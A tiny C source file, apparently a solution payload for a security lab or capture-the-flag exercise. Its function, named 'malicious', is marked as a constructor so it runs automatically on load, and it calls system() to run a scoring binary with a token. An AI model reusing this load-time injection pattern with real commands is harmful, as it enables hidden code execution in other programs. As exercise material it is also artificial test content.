#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 58a2c9dc-35c6-4ed4-a6f1-89faaa328aaf");
}
